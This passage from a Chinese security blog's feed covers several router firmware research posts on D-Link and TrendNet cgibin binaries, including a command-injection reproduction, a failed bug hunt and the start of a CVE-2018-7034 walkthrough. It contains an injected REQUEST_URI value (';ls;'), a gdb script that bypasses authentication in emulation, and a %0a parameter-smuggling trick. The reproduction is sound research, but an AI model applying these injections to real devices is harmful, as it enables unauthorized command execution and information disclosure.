<p>我是多按了几次 <code>F5</code> 就刷新成了下图的正确形式</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151319966.png" alt="image-20231115131929901" style="zoom: 67%;" />



<p>即使 <code>F5</code> 刷不出来正常的伪代码，查看此处汇编代码也能发现是传了两个参数， <code>$a0</code> 和 <code>$a1</code> 寄存器都有值，对 <code>$a1</code> 的值进行简单的追踪也可以分析出 <code>lxmldbc_system</code> 函数的第二个参数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151351439.png" alt="image-20231115135149369"></p>
<p>对 <code>lxmldbc_system</code> 函数的第二个参数进行分析，这两处无论走哪个，都绕不开 <code>sub_40A1C0</code> 函数。看起来似乎是解析了个什么字段？得具体分析一下 <code>sub_40A1C0</code> 函数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151404987.png" alt="image-20231115140447926" style="zoom: 67%;" />



<h3 id="sub-40A1C0函数分析"><a href="#sub-40A1C0函数分析" class="headerlink" title="sub_40A1C0函数分析"></a>sub_40A1C0函数分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_40A1C0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $s0</span></span><br><span class="line">  v2 = off_42C120;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="type">int</span>)(v3 ? *(_DWORD *)v3 : v2);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">void</span> **)v3 == &amp;off_42C120 || !v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, *(<span class="type">const</span> <span class="type">char</span> **)(v3 + <span class="number">8</span>)) )</span><br><span class="line">      <span class="keyword">return</span> *(_DWORD *)(v3 + <span class="number">12</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开始就是 <code>while</code> 死循环，<code> v3 = (int)(v3 ? *(_DWORD *)v3 : v2)</code> 这是一个三目运算符，如果 <code>v3</code> 为真的话就将 <code>*v3</code> 的值赋给 <code>v3</code> ，<code>v3</code> 为假则将 <code>v2</code> 赋值给它。因为 <code>v3</code> 初值是 <code>0</code> ，所以第一次进入循环 <code>v3</code> 取的就是地址 <code>0x42C120</code> 。<code>if ( (void **)v3 == &amp;off_42C120 || !v3 )</code> 在判断 <code>0x42C120</code> 里是否为空，如果为空的话就直接 <code>break</code> 结束循环，然后 <code>return 0</code></p>
<p>如果 <code>v3</code> 里不为空，则比较 <code>a1</code> 和 <code>v3+8</code> 的值（<code>a1</code> 是函数 <code>sub_40A1C0</code> 传进来的字符串），二者一样的话则返回 <code>*(v3+12)</code> 。分析到这里后，应该能发现这个函数是做了一个遍历链表的操作。</p>
<p>将 <code>0x42C120</code> 地址里装入一个链表头指针，大概一个结点的结构是这样</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Note</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *next_ptr;<span class="comment">//while循环通过遍历next_ptr，判断下一个结点</span></span><br><span class="line">    <span class="type">int</span> xxx;<span class="comment">//该字段无法根据此处代码猜测出来，但能大概确定此处有一个四字节类型的变量</span></span><br><span class="line">    <span class="type">char</span> *key;<span class="comment">//该字段与sub_40A1C0函数的参数 EVENT/ACTION/SERVICE 做对比</span></span><br><span class="line">    <span class="type">char</span> *value;<span class="comment">//如果key字段比较通过，返回value</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里是对 <code>0x42C120</code> 链表进行的检查和取值操作，这一步之前一定会有地方对其进行了创建链表和写入操作。</p>
<p>对地址 <code>0x42C120</code> 进行交叉引用，发现了三处操作指令（如下）分别是两次 <code>lw</code> 和一次 <code>sw</code> 指令。<code>sw $s0,off_42C120</code> 指令是将 <code>$s0</code> 寄存器里的值写到内存 <code>0x42C120</code> 处，因此肯定是这个位置进行链表的创建操作</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151458199.png" alt="image-20231115145801145" style="zoom:50%;" />



<p>跳转至此，发现位于 <code>sub_40A63C</code> 函数，这里显然是进行的初始化操作，参考这篇<a href="https://zikh26.github.io/posts/5f982ad5.html#cgibin-parse-request%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90">文章</a> 里的分析，当时我提到该函数是一个回调函数。由于调用关系有些错综复杂，动态调试到此处看一下解析后的字段更方便。</p>
<p><strong>注：在 <code>sub_403B10</code> 函数中有 <code>select</code> 函数，它检查了输入缓冲区中是否存在数据（比如 <code>CONTENT_LENGTH</code> 环境变量设置为 <code>10</code> ，走到这里为了防止卡住就得输入 <code>10</code> 个字符）具体分析可以参考 <a href="https://zikh26.github.io/posts/5f982ad5.html#sub-405AC0%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90">文章</a></strong></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151709068.png" alt="image-20231115170912006" style="zoom: 67%;" />

<h2 id="调试验证"><a href="#调试验证" class="headerlink" title="调试验证"></a>调试验证</h2><p><code>qemu</code> 启动脚本如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-mipsel -g 1234 -L .\</span><br><span class="line">	-0 &quot;service.cgi&quot; \</span><br><span class="line">	-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">	-E REQUEST_URI=&quot;wtf?EVENT=;ls;&quot; \</span><br><span class="line">	-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">	-E CONTENT_LENGTH=&quot;5&quot; \</span><br><span class="line">	./htdocs/cgibin</span><br></pre></td></tr></table></figure>



<p>我选择将断点下到 <code>0x40A6D4</code> <code>0x40A6B4</code> <code>0x40A6D0</code> 三个位置，分别查看上面分析的三个字段 <code>next_ptr</code> <code>key</code> <code>value</code> 是什么。</p>
<p>结果发现了一个有意思的情况，提示说断点 <code>0x40A6B4</code> 调整到了 <code>0x40a6b0</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151733308.png" alt="image-20231115173322252"></p>
<p>查看 <code>IDA</code> ，发现 <code>0x40A6B4</code> 地址是 <code>jalr</code> 指令的下一条，推断应该是受到 <code>MIPS</code> 架构中的分支延迟槽的影响。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151735761.png" alt="image-20231115173531720"></p>
<p>执行到地址 <code>0x40a6b8</code> 时，查看此时的 <code>$s0</code> 寄存器，因为 <code>sw $v0,8($s0)</code> 指令是向 <code>$s0+8</code> 的位置写入了值，用 <code>telescope</code> 很清楚的能看出来放的是 <code>aaa</code> 字符串的地址</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151745965.png" alt="image-20231115174525763"></p>
<p>等到对结构体初始化后进行查看，结合传入的环境变量 <code>REQUEST_URI=&quot;wtf?aaa=123&quot;</code> 可以很清楚的分析出 <code>REQUEST_URI</code> 中的 <code>?</code> 做为第一个分隔符。<code>?</code> 后面的内容被 <code>=</code> 再次分割，<code>=</code> 前面的值记录在了偏移 <code>8</code> 的地方，<code>=</code> 后面的值记录在了偏移 <code>12</code> 的地方</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151749781.png" alt="image-20231115174919568"></p>
<p>既然初始化的格式确定了，那么让 <code>sub_40A1C0</code> 函数解析出对应字段的值便轻而易举。以下图中 <code>43</code> 行代码为例，环境变量设置为 <code>REQUEST_URI=&quot;wtf?EVENT=;ls;&quot;</code> 便可以进行命令注入，成功执行 <code>ls</code> ，但前提是要通过 <code>sess_ispoweruser</code> 函数的认证。很显然仿真阶段对于认证函数必须得想办法绕过，来验证漏洞能否利用。可以选择在 <code>IDA</code> 中直接 <code>patch</code> 文件，将认证函数改成 <code>nop</code>。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151754634.png" alt="image-20231115175458559"></p>
<p>不过为了省事，我选择写了一个 <code>shell</code> 脚本，<code>gdb</code> 调试时，直接用 <code>set</code> 修改了认证函数的返回值</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set endian little</span><br><span class="line">set architecture mips</span><br><span class="line">target remote localhost:1234</span><br><span class="line">b *0x40a3a0</span><br><span class="line">c</span><br><span class="line">set $v0=1</span><br><span class="line">b *0x40A40C</span><br><span class="line">c</span><br></pre></td></tr></table></figure>



<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151808085.png" alt="image-20231115180827803" style="zoom:50%;" />



<p>直接 <code>q</code> 退出 <code>gdb</code> 调试，发现 <code>qemu</code> 启的程序这边已经成功执行了 <code>ls</code> 命令</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151810198.png" alt="image-20231115181030132"></p>
]]></content>
      <categories>
        <category>IOT安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>MIPS架构</tag>
        <tag>D-Link</tag>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次失败的漏洞挖掘过程</title>
    <url>/posts/d3519884.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录了一次失败的漏洞挖掘经历，但正是因为自己都在进行主观的思考，即使是失败了，这一次也学到了一些东西。我认为跟着别人文章照猫画虎成功做一遍，不如失败的独立思考探索有意义😎</p>
<span id="more"></span>

<p>事情的起因是想去复现一下 <code>D-Link DIR-825</code> 、 <code>TRENDnet TEW-632BRP</code> 命令注入漏洞 （<code>CVE-2020-10216</code> ）。因为一直没找到命令注入的点，一时兴起，就随便看了看 <code>DIR-825</code> 固件中的 <code>cgibin</code> 。大致看了一下后，又想着下载一个型号相近的 <code>DIR-850</code> 看看 <code>cgibin</code> 里有没有什么漏洞（我希望在不看漏洞披露信息的情况下，寻找一些比较明显的漏洞）</p>
<h2 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h2><p>在此之前，先记录下固件下载的过程，以 <code>D-Link DIR-825</code> 固件为例，首先我在搜索引擎中输入 <code>D-Link support</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310291033407.png" alt="image-20231029103357295" style="zoom: 50%;" />

<p>这里我是直接搜了 <code>DIR-825</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310291037029.png" alt="image-20231029103717873" style="zoom: 33%;" />

<p>居然没有搜到……这里没有显示这个版本的路由器</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310291038319.png" alt="image-20231029103856201" style="zoom: 33%;" />



<p>然后我又换了一种搜法 <code>D-Link DIR-825 firmware</code> </p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310291043416.png" alt="image-20231029104358341" style="zoom:50%;" />

<p>我找到了这个，这个貌似也是 <code>dlink</code> 的技术支持网站，但是比上面那个网站多了个后缀 <code>au</code></p>
<p>下载链接：<a href="http://support.dlink.com.au/download/download.aspx?product=DIR-825">http://support.dlink.com.au/download/download.aspx?product=DIR-825</a></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310291045321.png" alt="image-20231029104521250" style="zoom:50%;" />

<p>不过华神又给我了一个更全、更方便的网站 <a href="https://ftp.dlink.ru/pub/Router/">https://ftp.dlink.ru/pub/Router/</a> ，这里找 <strong>D-Link</strong> 的固件应该是很方便了。</p>
<h2 id="自主探索"><a href="#自主探索" class="headerlink" title="自主探索"></a>自主探索</h2><p>需要注意的是上面固件下载的过程中寻找的是 <code>DIR-825</code> ，但后面的所有分析都是基于固件 <code>DIR-850</code> 。经过简单的分析，我发现了一处疑似命令注入漏洞和一处疑似栈溢出漏洞的地方</p>
<h3 id="疑似的命令注入？"><a href="#疑似的命令注入？" class="headerlink" title="疑似的命令注入？"></a>疑似的命令注入？</h3><p>位于 <code>soapcgi_main</code> 函数中，这里 <code>REQUEST_URI</code> 内容给到了 <code>v3</code> 后续判断是否有 <code>?service=</code> ，做了简单的过滤后最终可以命令执行</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311081803589.png" alt="image-20231108180343514"></p>
<h3 id="疑似的栈溢出？"><a href="#疑似的栈溢出？" class="headerlink" title="疑似的栈溢出？"></a>疑似的栈溢出？</h3><p>位于 <code>sessioncgi_main</code> 函数这里 <code>REQUEST_URI</code> 无论匹配到的是 <code>form_login</code> 还是 <code>form_logout</code> 都可以触发 <code>weblogin_log</code> 函数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311081803502.png" alt="image-20231108180318418" style="zoom:50%;" />



<p>可以发现 <code>weblogin_log</code> 函数的第二个参数（也就是 <code>getenv(&quot;REMOTE_ADDR&quot;)</code> 的值 ）与 <code>::ffff:</code> 做对比，如果检查通过则执行 <code>strcpy</code> 函数进行拷贝。如果 <code>REMOTE_ADDR</code> 的值可控，在拷贝时就会造成栈溢出</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311081825805.png" alt="image-20231108182521717" style="zoom:50%;" />



<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>因为我感觉这两个漏洞都很浅，这种很多年前的设备都被无数人光临过了，大概率已经有了漏洞相关信息或者压根就用不了，但我还是想独立的确定一下漏洞到底能否利用。</p>
<p>直接访问 <code>soap.cgi</code> ，返回了 <code>404</code> （这里我不是很懂，但也有一点眉目，具体记录在了文章末尾 ），这意味着无法触发 <code>soapcgi_main</code> 函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311140827729.png" alt="image-20231114082744570"></p>
<p>这篇 <a href="https://blog.csdn.net/weixin_43815930/article/details/107937708">文章</a> 中提到，但是经过真机测试，发现设备并没有开启对 <code>soap</code> 的支持（我不确定能否手动开启它，我尝试了一些已知的方法，均未成功）</p>
<blockquote>
<p>如果我们将我们的注入指令放入service参数，即可完成指令注入，现在我们还需要知道这个漏洞如何触发，从soapcgi_main函数名可以得知这个函数是用于处理soap请求的，这是一种简单的基于XML的协议，可以使应用程序在分散或分布式的环境中通过HTTP来交换信息，也就是说首先目标设备要开启对soap的支持此漏洞才可以触发。</p>
</blockquote>
<p>去测试 <code>sessioncgi_main</code> 函数，我先用 <code>qemu</code> 用户级仿真了一下，发现如果 <code>REMOTE_ADDR</code> 确实可控的话，在漏洞函数返回时的地址会被破坏，导致程序崩溃。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311081924910.png" alt="image-20231108192425522"></p>
<p>咸鱼上淘了一个二手的 <code>DIR-850L</code> 真机，我打了一下发现响应包是正常的，返回了 <code>ok</code>。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311081930234.png" alt="image-20231108193051156"></p>
<p> 返回 <code>ok</code> 就意味着下图中的 <code>printf</code> 已经正常执行了，这说明 <code>weblogin_log</code> 函数正常返回，并没有栈溢出导致崩溃。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311081932595.png" alt="image-20231108193255552"></p>
<p>于是乎开始各种排查，我开始的重心一直在排查报文编写错误。<code>REMOTE_ADDR</code> 的值没有添加双引号？<code>GET</code> 方式试一下？溢出的字节不够多？ 还有什么字段也要伪造，没注意到？还是已经崩溃了，只不过<code>WEB</code> 界面没看到效果？</p>
<p>反正我当时抛出了很多疑问，然后一一进行了排除和验证，最后猜测只可能是 <code>REMOTE_ADDR</code> 字段没有控制成功。</p>
<p>经过搜索后，这篇 <a href="https://blog.csdn.net/ctwy291314/article/details/129404902">文章</a> 里提到 <code>REMOTE_ADDR</code> 字段是无法被客户端控制，尽管我感觉这里还是很奇怪，因为我用 <code>wireshark</code> 抓了一下发送的流量包，看到的 <code>REMOTE_ADDR</code> 还是我控制的那个值🙃</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131118024.png" alt="image-20231113111829911"></p>
<h2 id="未初始化漏洞？"><a href="#未初始化漏洞？" class="headerlink" title="未初始化漏洞？"></a>未初始化漏洞？</h2><p>除了上面提到的两个地方，我还发现了一个奇怪的点。在 <code>captchacgi_main</code> 函数中，貌似 <code>system</code> 执行时可能会存在一个未初始化漏洞？观察下图发现 <code>v10</code> ，在执行 <code>sprintf</code> 函数进行了拼接然后赋值给了 <code>v11</code>，可是 <code>v10</code> 自始至终并没有被赋值。我考虑有没有机会用栈里的残留值控制 <code>v10</code> ，于是又有了后文的探索</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311140930305.png" alt="image-20231114093006176"></p>
<p>运行程序，发现一直卡住了，并且没有任何回显，说明大概率陷入了某个死循环或者超长循环里。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311140937544.png" alt="image-20231114093702458"></p>
<h3 id="分金定穴"><a href="#分金定穴" class="headerlink" title="分金定穴"></a>分金定穴</h3><p>为了解决这个问题，我采用的方法是下大量断点来缩小范围，确定到底卡在了哪个位置（我自称这种方法为 <strong>分金定穴</strong> 😆）第一次将断点下到了 <code>cgibin_parse_request</code> 函数执行前</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131719110.png" alt="image-20231113171937913" style="zoom:50%;" />

<p>打完断点，发现可以直接 <code>c</code> 过来，排除了在此之前卡住的可能</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131720832.png" alt="image-20231113172012592" style="zoom: 33%;" />

<p>第二次将断点打到红框中的位置 <code>sess_generate_captcha</code> 函数执行前</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131722989.png" alt="image-20231113172222916" style="zoom:33%;" />

<p>发现依然可以 <code>c</code> 过来，第三次将断点打到 <code>0x40A3E0</code> 地址处（也就是 <code>sess_generate_captcha</code> 函数执行后），此时发现 <code>c</code> 的时候，就一直卡住了。因此判断大致范围一定是在 <code>sess_generate_captcha</code> 函数里</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131724915.png" alt="image-20231113172422626" style="zoom:50%;" />



<p>于是重调第二次，直接下到 <code>sess_generate_captcha</code> 函数内部，我选择下到 <code>sub_4095B4</code> 函数之前</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131727683.png" alt="image-20231113172727610" style="zoom:50%;" />

<p> 此时发现依然可以正常 <code>c</code> 过来，第二次我尝试下到了 <code>sub_4095B4</code> 函数执行之后</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131730641.png" alt="image-20231113173009502" style="zoom: 50%;" />



<p>发现又卡住了，那就说明具体的范围就在 <code>sub_4095B4</code> 函数里被什么东西卡住了</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131731688.png" alt="image-20231113173138521" style="zoom:50%;" />



<p>直接分析 <code>IDA</code> 中的代码，发现 <code>v4</code> 没有初始化，而 <code>v0</code> 初始值是 <code>1</code>，每次循环 <code>+1</code> ，只有 <code>v1</code> 的值大于 <code>v4</code> 时才能跳出这个死循环。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131735218.png" alt="image-20231113173503142" style="zoom:50%;" />



<p>因为没有变量初始化，就导致从栈里取的值是随机的，所以再次调试，看下 <code>v4</code> 的初始值是什么，找到 <code>slt</code> 比较的汇编代码， <code>$v0</code> 寄存器就为 <code>v4</code> 的值，将断点下到这里</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131741688.png" alt="image-20231113174105614"></p>
<p>通过调试发现 <code>$v0</code> 寄存器中是一个栈地址，这意味着要跑二十多亿次的循环才能继续往下运行</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131744671.png" alt="image-20231113174442476" style="zoom:50%;" />

<p>但这是否意味着真实环境里的这个 <code>captcha.cgi</code> 也要等这么久？拿真机测试一下，发现直接回显，这意味着远程环境里的这个 <code>v4</code> 肯定不是栈地址，我猜测大概率可能就是个 <code>0</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131753698.png" alt="image-20231113175346616"></p>
<p>因此为了和真实环境保持尽可能的接近，我选择用 <code>set</code> 命令直接把  <code>$v0</code> 寄存器改成 <code>0</code> ，这样就可以正常执行到下面的 <code>if</code> 分支，但因为某些条件，导致进入的是 <code>else</code> 。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131759833.png" alt="image-20231113175922743"></p>
<p>访问真机可以看到触发的是 <code>if</code> 里的内容，依然是为了和真实环境保持一致，所以继续用 <code>set</code> 命令来改变正常的执行流</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131803503.png" alt="image-20231113180322427"></p>
<p>此时执行到了 <code>sprintf</code> 函数，查看第四个参数（结合下面两张图）发现其是个栈里残留的地址，在其低地址处没有输入大量字符串的机会，所以此处 <code>system</code> 传入的一个未初始化数组也不可控制（本想着用栈的残留值偷鸡）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131812580.png" alt="image-20231113181232436" style="zoom:50%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131808372.png" alt="image-20231113180808173" style="zoom:50%;" />

<p>😅又是一次失败的分析</p>
<h2 id="问题与解决"><a href="#问题与解决" class="headerlink" title="问题与解决"></a>问题与解决</h2><p>这里对探索过程中遇到的问题和解决方法进行了记录</p>
<h3 id="gdbserver连接报错"><a href="#gdbserver连接报错" class="headerlink" title="gdbserver连接报错"></a>gdbserver连接报错</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) target remote 192.168.110.111:7788</span><br><span class="line">Remote debugging using 192.168.110.111:7788</span><br><span class="line">1</span><br><span class="line">sl</span><br><span class="line">Ignoring packet error, continuing...</span><br><span class="line">warning: unrecognized item &quot;timeout&quot; in &quot;qSupported&quot; response</span><br><span class="line">si</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ignoring packet error, continuing...</span><br><span class="line">Ignoring packet error, continuing...</span><br><span class="line">Bogus trace status reply from target: timeout</span><br></pre></td></tr></table></figure>

<p>解决方法：将启动 <code>qemu</code> 时的 <strong>vmlinux-2.6.32-5-4kc-malta</strong> 改成 <strong>vmlinux-3.2.0-4-4kc-malta</strong> </p>
<h3 id="gdb-multiarch-xxx-发生段错误"><a href="#gdb-multiarch-xxx-发生段错误" class="headerlink" title="gdb-multiarch xxx 发生段错误"></a>gdb-multiarch xxx 发生段错误</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311011036642.png" alt="image-20231101103629341"></p>
<p>出现上面的问题，不能写成 <code>gdb-multiarch session.cgi</code> ，因为本地加载 <code>session.cgi</code> 的时候会缺少对应的库，触发段错误。直接写成 <code>gdb-multiarch</code> 就行</p>
<h3 id="gdb-multiarch报错gdb-MemoryError"><a href="#gdb-multiarch报错gdb-MemoryError" class="headerlink" title="gdb-multiarch报错gdb.MemoryError"></a>gdb-multiarch报错gdb.MemoryError</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311011035373.png" alt="image-20231101103553908"></p>
<p>这个问题说明 <code>gdb</code> 没能正确的解析接收的数据，需要提前设置架构和字节序。假如我这个要调试的程序为 <code>mips</code> 架构，大端序。执行 <code>set endian big</code> <code>set architecture mips</code> 两个命令即可</p>
<h3 id="调试二进制文件报错-ld-uClibc-so-0-No-such-file-or-directory"><a href="#调试二进制文件报错-ld-uClibc-so-0-No-such-file-or-directory" class="headerlink" title="调试二进制文件报错 ld-uClibc.so.0: No such file or directory"></a>调试二进制文件报错 ld-uClibc.so.0: No such file or directory</h3><p>开始直接在 <code>Desktop</code> 目录执行了 <code>sudo chroot . ./qemu-mips-static ./captcha.cgi</code> 命令，但是报错如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311071020090.png" alt="image-20231107102050040"></p>
<p>这里是因为 <code>chroot</code> 做了一个隔离环境，以 <code>Desktop</code> 目录作为根目录，而 <code>captcha.cgi</code>（已经过重命名，源程序名为 <code>cgibin</code>）为动态链接程序，会去寻找 <code>/lib</code> 目录下的 <code>libc</code> 和 <code>ld</code> 文件，因为我这里的 <code>Desktop</code> 目录下肯定没有 <code>lib</code> 目录，导致报错。</p>
<p>解决方法：进入由路由器固件解压后的文件系统，执行上面相同的命令，以当前目录为根目录做一个隔离环境，这里的 <code>/lib</code> 肯定是存在与 <code>cgibin</code> 配套的 <code>libc</code> 文件（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311131643294.png" alt="image-20231113164300933"></p>
<h3 id="为什么有的cgi可以被触发，有的则404"><a href="#为什么有的cgi可以被触发，有的则404" class="headerlink" title="为什么有的cgi可以被触发，有的则404"></a>为什么有的cgi可以被触发，有的则404</h3><p>我原先也是一直纳闷这个问题的，直到我无意中搜了一下文件系统里的 <code>cgi</code> 文件，我突然感觉这些文件很眼熟。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311141239124.png" alt="image-20231114123911932" style="zoom:50%;" />

<p>因为我在真机上测试了一下 <code>cgibin</code> 程序中的哪些名称是可以访问成功的，貌似那些名称就是上面的文件。仔细比对后，确实如此。只要是在 <code>htdocs/web</code> 目录下的文件都可以直接被访问到，而其他文件之所以 <code>404</code> ， 就是因为 <code>web</code> 目录下并没有对应的 <code>cgi</code> 文件？但返回 <code>500</code> 的又会因为什么原因呢，暂且未知。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.coder.work/article/7303050">c++ - 通过gdb连接到远程gdbserver时出错 - IT工具网 (coder.work)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/385503740">D-Link DIR-825和TRENDnet TEW-632BRP命令注入漏洞(CVE-2020-10216) - 知乎 (zhihu.com)</a></p>
<p><a href="https://noob3xploiter.medium.com/hacking-the-dlink-dir-615-for-fun-and-no-profit-part-5-multiple-rces-d508f58e2471">Hacking the dlink DIR-615 for fun and no profit Part 5: Multiple RCE’s | by Brandon Roldan | Medium — 为了好玩而无利可救地破解 dlink DIR-615 第 5 部分：多个 RCE |由 Brandon Roldan |中等</a></p>
<p><a href="https://blog.csdn.net/weixin_43815930/article/details/107937708">D-Link DIR850L-A1固件指令执行漏洞_ghidra逆向dlink固件-CSDN博客</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>MIPS架构</tag>
        <tag>D-Link</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-7034复现（TrendNet路由器登录信息泄露）</title>
    <url>/posts/5f982ad5.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该漏洞的利用是通过发送 <code>POST</code> 报文在正常字段 <code>SERVICES=DEVICE.ACCOUNT</code> 后紧跟了一个 <code>AUTHORIZED_GROUP=1</code> （二者用 <code>%0a</code> 连接），导致 <code>cgibin</code> 文件解析时先识别到了第一个 <code>=</code> ，认为 <code>SERVICES</code> 是键，<code>DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1</code> 是值。随后又对字符串进行解码，<code>%0a</code> 处理为 <code>\n</code>，此时内存中字符串为 <code>_POST_SERVICES=DEVICE.ACCOUNT\nAUTHORIZED_GROUP=1</code> ，后续在 <code>cgibin</code> 中认证失败，在此基础上添加了 <code>AUTHORIZED_GROUP=-1</code> 。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271916033.png" alt="image-20231027191647900"></p>
<p>之后把整个数据发送给 <code>php</code> 文件进行处理， <code>getcfg.php</code> 文件中<code>if($AUTHORIZED_GROUP &lt; 0)</code> 获取字段值时，首先解析到的是 <code>AUTHORIZED_GROUP=1</code> 从而通过了验证。又因为可以加载 <code>htdocs/webinc/getcfg</code> 目录下的任意文件，最终造成敏感文件的信息泄露</p>
<span id="more"></span>

<h2 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h2><p>由于平常复现漏洞的时候，师傅们一般都把固件上传到了文章中，因此每次复现的时候我都没有考虑过固件下载的问题。如果现在要我进行漏洞挖掘或者复现很新的漏洞，我确实没有把握一定能找到对应厂商发布的固件…😶‍🌫️，之后再复现漏洞我打算都把找固件的过程也记录一下（萌新确实是菜成这样的…）</p>
<p>本篇文章要复现 <strong>TrendNet</strong>  的漏洞，根据几次找固件的经验来看，应该在搜索引擎里搜 <code>TrendNet support</code> （因为也没人告诉过我这一点，全靠为数不多的<del>经验</del>猜的，不保证正确和严谨😥，至少这次是没问题的🥰）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261012393.png" alt="image-20231026101220172" style="zoom: 50%;" />





<p>根据 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7034">CVE-2018-7034</a> 披露信息</p>
